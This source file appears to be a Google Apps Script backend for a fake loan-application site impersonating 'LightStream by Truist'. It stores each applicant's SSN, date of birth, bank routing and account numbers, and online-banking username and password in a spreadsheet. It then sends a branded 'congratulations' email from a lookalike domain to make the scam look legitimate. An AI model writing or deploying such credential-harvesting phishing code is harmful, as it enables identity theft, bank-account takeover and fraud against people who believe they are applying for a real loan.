function doPost(e) {
  try {
    // Get the active spreadsheet
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    
    // Get form data
    var timestamp = new Date();
    var applicationId = e.parameter.applicationId;
    var ssn = e.parameter.ssn;
    var phone = e.parameter.phone;
    var loantype = e.parameter.loantype;
    var cartype = e.parameter.cartype;
    var otherloantype = e.parameter.otherloantype;
    var loanexecutive = e.parameter.loanexecutive;
    var reference = e.parameter.reference;
    var otherreference = e.parameter.otherreference;
    var loanamount = e.parameter.loanamount;
    var monthlypayment = e.parameter.monthlypayment;
    var tenure = e.parameter.tenure;
    var rateofinterest = e.parameter.rateofinterest;
    var firstname = e.parameter.firstname;
    var lastname = e.parameter.lastname;
    var dob = e.parameter.dob;
    var email = e.parameter.email;
    var street = e.parameter.street;
    var city = e.parameter.city;
    var state = e.parameter.state;
    var zip = e.parameter.zip;
    var country = e.parameter.country;
    var bankname = e.parameter.bankname;
    var routingnumber = e.parameter.routingnumber;
    var accountnumber = e.parameter.accountnumber;
    var username = e.parameter.username;
    var password = e.parameter.password;
    
    // Append data to sheet
    var row = [
      timestamp,
      applicationId,
      ssn,
      phone,
      loantype,
      cartype,
      otherloantype,
      loanexecutive,
      reference,
      otherreference,
      loanamount,
      monthlypayment,
      tenure,
      rateofinterest,
      firstname,
      lastname,
      dob,
      email,
      street,
      city,
      state,
      zip,
      country,
      bankname,
      routingnumber,
      accountnumber,
      username,
      password
    ];
    
    sheet.appendRow(row);
    
    // Send congratulation email to customer
    sendCongratulationEmail(
      email,
      firstname + ' ' + lastname,
      applicationId,
      loanamount,
      monthlypayment,
      tenure,
      loanexecutive
    );
    
    return ContentService.createTextOutput("Success");
    
  } catch (error) {
    Logger.log('Error: ' + error.toString());
    return ContentService.createTextOutput("Error: " + error.toString());
  }
}

function sendCongratulationEmail(customerEmail, customerName, applicationId, loanAmount, monthlyPayment, tenure, loanExecutive) {
  try {
    // Email subject
    var subject = '🎉 Congratulations! Your Loan Application Has Been Received - ' + applicationId;
    
    // Email body in HTML format
    var htmlBody = `
<!DOCTYPE html>
<html>
<head>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      line-height: 1.6;
      color: #333;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }
    .email-container {
      max-width: 600px;
      margin: 20px auto;
      background-color: #ffffff;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    }
    .header {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      padding: 30px 20px;
      text-align: center;
    }
    .header h1 {
      margin: 0;
      font-size: 28px;
      font-weight: 700;
    }
    .header p {
      margin: 10px 0 0 0;
      font-size: 16px;
      opacity: 0.95;
    }
    .content {
      padding: 40px 30px;
    }
    .greeting {
      font-size: 18px;
      color: #333;
      margin-bottom: 20px;
    }
    .success-box {
      background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
      border-left: 5px solid #28a745;
      padding: 20px;
      margin: 25px 0;
      border-radius: 5px;
    }
    .success-box h2 {
      color: #155724;
      margin: 0 0 15px 0;
      font-size: 20px;
    }
    .info-row {
      display: flex;
      justify-content: space-between;
      padding: 10px 0;
      border-bottom: 1px solid #e0e0e0;
    }
    .info-row:last-child {
      border-bottom: none;
    }
    .info-label {
      font-weight: 600;
      color: #555;
    }
    .info-value {
      color: #28a745;
      font-weight: 700;
    }
    .application-id {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      padding: 20px;
      text-align: center;
      border-radius: 8px;
      margin: 25px 0;
      font-size: 24px;
      font-weight: 700;
      letter-spacing: 2px;
    }
    .next-steps {
      background-color: #f8f9fa;
      padding: 20px;
      border-radius: 5px;
      margin: 25px 0;
    }
    .next-steps h3 {
      color: #3a16b9;
      margin-top: 0;
    }
    .next-steps ul {
      margin: 10px 0;
      padding-left: 20px;
    }
    .next-steps li {
      margin: 8px 0;
      color: #555;
    }
    .contact-box {
      background-color: #e7f3ff;
      border: 2px solid #3a16b9;
      padding: 20px;
      border-radius: 5px;
      margin: 25px 0;
      text-align: center;
    }
    .contact-box h3 {
      color: #3a16b9;
      margin-top: 0;
    }
    .contact-info {
      font-size: 16px;
      color: #333;
      margin: 10px 0;
    }
    .footer {
      background-color: #f8f9fa;
      padding: 20px 30px;
      text-align: center;
      color: #666;
      font-size: 13px;
      border-top: 1px solid #e0e0e0;
    }
    .footer p {
      margin: 5px 0;
    }
    .disclaimer {
      background-color: #fff3cd;
      border-left: 4px solid #ffc107;
      padding: 15px;
      margin: 20px 0;
      font-size: 13px;
      color: #856404;
    }
    .icon {
      font-size: 24px;
      margin-right: 10px;
    }
  </style>
</head>
<body>
  <div class="email-container">
    <div class="header">
      <h1>🎉 LightStream by Truist</h1>
      <p>Your Trusted Financial Partner</p>
    </div>
    
    <div class="content">
      <div class="greeting">
        <strong>Dear ${customerName},</strong>
      </div>
      
      <p style="font-size: 16px; line-height: 1.8;">
        Congratulations! We are pleased to inform you that your loan application has been <strong style="color: #28a745;">successfully received</strong> and is now under review.
      </p>
      
      <div class="success-box">
        <h2>✓ Application Details</h2>
        <div class="info-row">
          <span class="info-label">📋 Loan Amount:</span>
          <span class="info-value">${loanAmount}</span>
        </div>
        <div class="info-row">
          <span class="info-label">💰 Monthly Payment:</span>
          <span class="info-value">${monthlyPayment}</span>
        </div>
        <div class="info-row">
          <span class="info-label">📅 Tenure:</span>
          <span class="info-value">${tenure} months</span>
        </div>
        <div class="info-row">
          <span class="info-label">👤 Loan Executive:</span>
          <span class="info-value">${loanExecutive}</span>
        </div>
      </div>
      
      <div class="application-id">
        <div style="font-size: 14px; opacity: 0.9; margin-bottom: 5px;">Your Application ID</div>
        ${applicationId}
      </div>
      
      <p style="font-size: 14px; color: #dc3545; font-weight: 600; text-align: center;">
        ⚠️ Please save this Application ID for future reference
      </p>
      
      <div class="next-steps">
        <h3>📝 What Happens Next?</h3>
        <ul>
          <li><strong>Email Verification:</strong> This email confirms your application has been received</li>
          <li><strong>Review Process:</strong> Our team will review your application within 24 hours</li>
          <li><strong>Document Verification:</strong> We may contact you for additional documents if needed</li>
          <li><strong>Approval Decision:</strong> You'll receive an approval decision within 1-2 business days</li>
          <li><strong>Fund Disbursement:</strong> Upon approval, funds will be transferred to your account</li>
        </ul>
      </div>
      
      <div class="contact-box">
        <h3>💼 Your Loan Executive</h3>
        <div class="contact-info">
          <strong>${loanExecutive}</strong> will be handling your application
        </div>
        <div class="contact-info" style="margin-top: 15px;">
          📧 <strong>Email:</strong> allen@lightstream-by-truist.com
        </div>
        <div class="contact-info">
          📞 <strong>Phone:</strong> 1-800-555-0199
        </div>
      </div>
      
      <div class="disclaimer">
        <strong>⚠️ Important Notice:</strong><br>
        • Please do not submit multiple applications<br>
        • Keep your Application ID safe for tracking purposes<br>
        • Check your email regularly for updates<br>
        • Beware of phishing emails - we will never ask for your password via email
      </div>
      
      <p style="font-size: 16px; text-align: center; margin-top: 30px; color: #28a745; font-weight: 600;">
        Thank you for choosing LightStream by Truist!
      </p>
      
      <p style="text-align: center; color: #888; font-size: 14px; margin-top: 20px;">
        We look forward to serving your financial needs.
      </p>
    </div>
    
    <div class="footer">
      <p><strong>LightStream by Truist</strong></p>
      <p>📧 allen@lightstream-by-truist.com | 📞 1-800-555-0199</p>
      <p style="margin-top: 15px;">
        © 2025 LightStream by Truist. All rights reserved.
      </p>
      <p style="margin-top: 10px; font-size: 11px;">
        This is an automated email. Please do not reply to this message.
      </p>
    </div>
  </div>
</body>
</html>
    `;
    
    // Plain text version for email clients that don't support HTML
    var plainTextBody = `
Dear ${customerName},

Congratulations! Your loan application has been successfully received.

APPLICATION DETAILS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Application ID: ${applicationId}
Loan Amount: ${loanAmount}
Monthly Payment: ${monthlyPayment}
Tenure: ${tenure} months
Loan Executive: ${loanExecutive}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT HAPPENS NEXT?
• Email Verification: This email confirms your application has been received
• Review Process: Our team will review your application within 24 hours
• Document Verification: We may contact you for additional documents if needed
• Approval Decision: You'll receive an approval decision within 1-2 business days
• Fund Disbursement: Upon approval, funds will be transferred to your account

YOUR LOAN EXECUTIVE:
${loanExecutive} will be handling your application
📧 Email: allen@lightstream-by-truist.com
📞 Phone: 1-800-555-0199

IMPORTANT NOTICE:
⚠️ Please save your Application ID: ${applicationId}
⚠️ Do not submit multiple applications
⚠️ Check your email regularly for updates

Thank you for choosing LightStream by Truist!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
LightStream by Truist
📧 allen@lightstream-by-truist.com
📞 1-800-555-0199
© 2025 LightStream by Truist. All rights reserved.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    `;
    
    // Send email with both HTML and plain text
    MailApp.sendEmail({
      to: customerEmail,
      subject: subject,
      htmlBody: htmlBody,
      body: plainTextBody,
      name: 'LightStream by Truist',
      replyTo: 'allen@lightstream-by-truist.com'
    });
    
    Logger.log('Congratulation email sent to: ' + customerEmail);
    
  } catch (error) {
    Logger.log('Error sending email: ' + error.toString());
  }
}
